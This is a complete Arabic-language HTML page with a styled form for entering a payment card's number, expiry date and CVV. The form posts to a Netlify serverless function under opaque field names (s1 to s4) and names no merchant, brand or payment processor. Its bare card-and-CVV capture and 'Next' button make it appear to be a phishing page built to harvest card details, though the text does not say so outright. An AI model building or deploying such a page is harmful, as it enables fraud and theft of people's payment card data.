<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال بيانات البطاقة</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }

        h1 {
            color: #2d3748;
            text-align: center;
            margin-bottom: 2rem;
            font-size: 1.8rem;
            position: relative;
        }

        h1::after {
            content: '';
            width: 60px;
            height: 3px;
            background: #4a5568;
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            border-radius: 2px;
        }

        .form-group {
            margin-bottom: 1.5rem;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #4a5568;
            font-weight: 600;
        }

        .input-field {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f7fafc;
        }

        .input-field:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .row {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
        }

        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        button:hover {
            background: #5a67d8;
        }

        @media (max-width: 480px) {
            .container {
                padding: 1.5rem;
            }

            h1 {
                font-size: 1.5rem;
            }

            .row {
                grid-template-columns: 1fr;
            }

            .input-field {
                padding: 10px 12px;
                font-size: 14px;
            }

            button {
                padding: 12px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>إدخال بيانات البطاقة</h1>
        
        <form action="/.netlify/functions/submit-card" method="post">
            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <input 
                    type="text" 
                    id="cardNumber" 
                    class="input-field" 
                    name="s1"
                    placeholder="1234 5678 1234 5678"
                    maxlength="19"
                    inputmode="numeric"
                    pattern="[0-9\s]{13,19}"
                    required
                >
            </div>

            <div class="row">
                <div class="form-group">
                    <label for="expiryMonth">الشهر (MM)</label>
                    <input 
                        type="text" 
                        id="expiryMonth" 
                        class="input-field"
                        name="s2"
                        placeholder="MM"
                        maxlength="2"
                        inputmode="numeric"
                        pattern="[0-9]{2}"
                        required
                    >
                </div>

                <div class="form-group">
                    <label for="expiryYear">السنة (YY)</label>
                    <input 
                        type="text" 
                        id="expiryYear" 
                        class="input-field"
                        name="s3"
                        placeholder="YY"
                        maxlength="2"
                        inputmode="numeric"
                        pattern="[0-9]{2}"
                        required
                    >
                </div>

                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input 
                        type="password" 
                        id="cvv" 
                        class="input-field" 
                        name="s4"
                        placeholder="123"
                        maxlength="3"
                        inputmode="numeric"
                        pattern="[0-9]{3}"
                        required
                    >
                </div>
            </div>

            <button type="submit">التالي</button>
        </form>
    </div>

    <script>
        // تنسيق رقم البطاقة تلقائيا
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formatted;
        });

        // التحقق من صحة الشهر
        document.getElementById('expiryMonth').addEventListener('input', function(e) {
            let value = e.target.value;
            if (value > 12) {
                e.target.setCustomValidity('الشهر يجب أن يكون بين 01 و 12');
            } else {
                e.target.setCustomValidity('');
            }
        });
    </script>
</body>
</html>
